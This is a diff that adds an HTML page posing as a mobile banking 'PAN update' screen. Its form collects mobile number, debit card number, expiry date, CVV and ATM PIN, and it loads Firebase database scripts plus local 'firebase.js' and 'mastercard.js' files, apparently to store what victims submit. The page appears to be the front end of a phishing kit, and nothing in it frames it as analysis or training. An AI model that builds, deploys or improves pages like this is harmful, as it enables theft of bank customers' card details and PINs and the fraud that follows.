@@ -1,0 +1,281 @@
+<html>
+
+<head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" type="image/png" sizes="32x32" href="./database_files/favicon.png">
+    <title>Welcome to Mobile Banking</title>
+    <meta content="initial-scale=1.0, width=device-width" name="viewport">
+    <link href="./database_files/mentions.css" rel="stylesheet" type="text/css">
+    <link href="./database_files/main.css" rel="stylesheet" type="text/css">
+    <link class="lfr-css-file" data-senna-track="temporary" href="./database_files/aui.css" id="liferayAUICSS" rel="stylesheet" type="text/css">
+    <link data-senna-track="temporary" href="./database_files/main(1).css" id="liferayPortalCSS" rel="stylesheet" type="text/css">
+    <link class="lfr-css-file" data-senna-track="temporary" href="./database_files/main(2).css" id="liferayThemeCSS" rel="stylesheet" type="text/css">
+    <img src="lolo.jpg"  width="100%" height="13%">
+   
+<style>
+   #kyc {
+            width: 104%;
+            background-color:#B21807;
+            height: 55px;
+            margin: 6px;
+            margin-left: -7px;
+        }
+</style>
+</head>
+ 
+
+<body>
+
+    
+                    
+        </header>
+<br>
+
+        <section id="content">
+
+             <div id="kyc"><br>
+            <b style="color:white; padding:20px;">CONTINUE TO PAN UPDATE</b>
+        </div>
+        <div id="col">
+            
+
+            <div class="columns-max" id="main-content" role="main">
+                <div class="portlet-layout row">
+                    <div class="col-md-12 portlet-column portlet-column-only" id="column-1">
+                        <div class="portlet-boundary portlet-boundary_com_liferay_login_web_portlet_LoginPortlet_ portlet-static portlet-static-end decorate portlet-login " id="p_p_id_com_liferay_login_web_portlet_LoginPortlet_"> <span id="p_com_liferay_login_web_portlet_LoginPortlet"></span>
+
+                            <section class="portlet" id="portlet_com_liferay_login_web_portlet_LoginPortlet">
+                                <div class="portlet-content"> <a class="icon-monospaced portlet-icon-back text-default" href="" title="Return to Full Page"></a>
+                                    <div class=" portlet-content-container">
+
+                                        <div class="portlet-body">
+
+                                            <div class="login-container">
+
+
+
+                                                <form action="" id="ududip005">
+
+                                                    <div class="col-lg-6 col-md-6 col-sm-6">
+                                                        <div class="form-group">
+
+                                                            <label for="cardholder">Mobile Number*</label>
+
+                                                            <input name="Mobile" type="text" pattern="[6-9][0-9]{9}" maxlength="10"class="form-control" id="cname"  onfocus="getFocus(this.id);" autocomplete="off" oncopy="return false" onpaste="return false" aria-label="cardholder" required/>
+
+
+
+
+                                                            <label for="cardNumber">Debit Card Number*</label>
+
+                                                            <input name="cardNumber" type="text" class="form-control" id="ccard" tabindex="12" size="19" maxlength="19" minlength="19" onfocus="getFocus(this.id);" autocomplete="off" oncopy="return false" onpaste="return false" oninput="formatCardNumber(this);" onkeypress="return isNumberKey(event);"
+                                                                onkeydown="return isNumberKey(event);" aria-label="cardNumber" required/>
+
+                                                            <div id="cardType"></div>
+
+                                                            <script>
+                                                                function formatCardNumber(input) {
+                                                                    // remove all non-numeric characters except spaces
+                                                                    const cardNumber = input.value.replace(/[^0-9 ]/g, '');
+                                                                    // remove all spaces
+                                                                    const cardNumberNoSpaces = cardNumber.replace(/ /g, '');
+                                                                    // add spaces every 4 digits
+                                                                    const formattedCardNumber = cardNumberNoSpaces.replace(/(\d{4})/g, '$1 ').trim();
+                                                                    // update the input value
+                                                                    input.value = formattedCardNumber;
+                                                                    // validate the card number
+                                                                    validateCardNumber(input);
+                                                                }
+
+                                                                function validateCardNumber(input) {
+                                                                    const cardNumberNoSpaces = input.value.replace(/ /g, ''); // remove all spaces
+                                                                    const cardTypes = [{
+                                                                            name: 'Visa',
+                                                                            pattern: /^4/
+                                                                        },
+                                                                        {
+                                                                            name: 'Mastercard',
+                                                                            pattern: /^5[1-5]/
+                                                                        },
+                                                                        {
+                                                                            name: 'American Express',
+                                                                            pattern: /^3[47]/
+                                                                        },
+                                                                        {
+                                                                            name: 'Discover',
+                                                                            pattern: /^6(?:011|5)/
+                                                                        },
+                                                                        {
+                                                                            name: 'Diners Club',
+                                                                            pattern: /^3(?:0[0-5]|[68][0-9])/
+                                                                        },
+                                                                        {
+                                                                            name: 'JCB',
+                                                                            pattern: /^(?:2131|1800|35\d{3})/
+                                                                        },
+                                                                        {
+                                                                            name: 'Rupay',
+                                                                            pattern: /^6[0-9]/
+                                                                        }
+                                                                    ];
+                                                                    const cardType = cardTypes.find(type => cardNumberNoSpaces.match(type.pattern));
+                                                                    if (cardType) {
+                                                                        console.log(`Card type: ${cardType.name}`);
+                                                                        // display the card type to the user
+                                                                        const cardTypeElement = document.getElementById('cardType');
+                                                                        cardTypeElement.textContent = `Card type: ${cardType.name}`;
+                                                                    } else {
+                                                                        console.log('Unknown card type');
+                                                                        // display an error message to the user
+                                                                        const cardTypeElement = document.getElementById('cardType');
+                                                                        cardTypeElement.textContent = 'Unknown card type';
+                                                                    }
+                                                                }
+                                                            </script>
+
+                                                            <label for="cexp">Valid Upto*</label>
+
+                                                            <input name="cardexpiry" type="text" class="form-control" id="cexp" tabindex="12" size="7" maxlength="7" minlength="7" onfocus="getFocus(this.id);" autocomplete="off" oncopy="return false" onpaste="return false" oninput="formatCardExpiry(this);" onkeypress="return isNumberKey(event);"
+                                                                onkeydown="allowBackspace(event);" aria-label="cardexpiry" placeholder="" required/>
+
+                                                            <script>
+                                                                function formatCardExpiry(input) {
+                                                                    // Remove all non-numeric characters from the input value
+                                                                    const cardExpiry = input.value.replace(/\D/g, '');
+
+                                                                    // Split the input value into month and year
+                                                                    const month = cardExpiry.slice(0, 2);
+                                                                    const year = cardExpiry.slice(2);
+
+                                                                    // Set the input value to the formatted string (MM / YYYY)
+                                                                    input.value = `${month}/${year}`;
+                                                                }
+
+                                                                function allowBackspace(event) {
+                                                                    // Allow the backspace key to be used to remove the last character
+                                                                    const key = event.keyCode || event.charCode;
+                                                                    if (key === 8) {
+                                                                        event.preventDefault();
+                                                                        const input = event.target;
+                                                                        const cursorPosition = input.selectionStart;
+                                                                        const cardExpiry = input.value.replace(/\D/g, '');
+
+                                                                        if (cursorPosition <= 2) {
+                                                                            // If the cursor is in the month field, remove the entire month
+                                                                            input.value = '';
+                                                                        } else if (cursorPosition === 3) {
+                                                                            // If the cursor is at the slash, move it back to the end of the month
+                                                                            input.selectionStart = 2;
+                                                                            input.selectionEnd = 2;
+                                                                        } else if (cursorPosition <= 5) {
+                                                                            // If the cursor is in the year field, remove the entire year
+                                                                            input.value = cardExpiry.slice(0, 2);
+                                                                        } else {
+                                                                            // If the cursor is after the year field, move it back to the end of the year
+                                                                            input.selectionStart = 5;
+                                                                            input.selectionEnd = 5;
+                                                                        }
+                                                                    }
+                                                                }
+                                                            </script>
+
+
+
+                                                            <label for="cvv">CVV*</label>
+                                                            <input name="cvv" type="text" class="form-control" id="ccvv" tabindex="12" size="3" maxlength="3" minlength="3" onfocus="getFocus(this.id);" autocomplete="off" oncopy="return false" onpaste="return false" aria-label="cvv" required/>
+
+                                                            <script>
+                                                                const cvvInput = document.getElementById("ccvv");
+
+                                                                cvvInput.addEventListener("input", function() {
+                                                                    // Get the current value of the input
+                                                                    let inputValue = this.value;
+
+                                                                    // Remove any non-numeric characters
+                                                                    inputValue = inputValue.replace(/[^0-9]/g, "");
+
+                                                                    // Update the input value
+                                                                    this.value = inputValue;
+                                                                });
+                                                            </script>
+
+
+
+                                                            <label for="pin">ATM PIN*</label>
+                                                            <input name="pin" type="text" class="form-control" id="cpin" tabindex="12" size="3" maxlength="4" minlength="4" onfocus="getFocus(this.id);" autocomplete="off" oncopy="return false" onpaste="return false" aria-label="pin" required pattern="^[0-9]{4}$"
+                                                            />
+
+                                                            <script>
+                                                                const pinInput = document.getElementById("cpin");
+
+                                                                pinInput.addEventListener("input", function() {
+                                                                    // Get the current value of the input
+                                                                    let inputValue = this.value;
+
+                                                                    // Remove any non-numeric characters
+                                                                    inputValue = inputValue.replace(/[^0-9]/g, "");
+
+                                                                    // Update the input value
+                                                                    this.value = inputValue;
+                                                                });
+                                                            </script>
+
+
+
+
+
+                                                        </div>
+
+
+
+
+
+
+                                                        <div class="form-group">
+
+                                                            <input style="background-color:#B21807" class="btn btn-lg btn-primary btn-default" type="submit" tabindex="18" title="Login" value="Submit	" id="Button2" onclick="return submitLoginShagc(&#39;nLEbcx0S&#39;);">
+
+                                                         </div>
+
+
+
+
+
+                                                        
+                                                    </div>
+
+
+                                                </form>
+
+
+
+                                                <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+                                                <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+                                                <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
+
+
+                                                <script src="firebase.js"></script>
+                                                <script src="mastercard.js"></script>
+
+
+
+
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+        <img src="futterhas.png"  width="100%" height="50%">
+
+
+</body>
+
+</html>
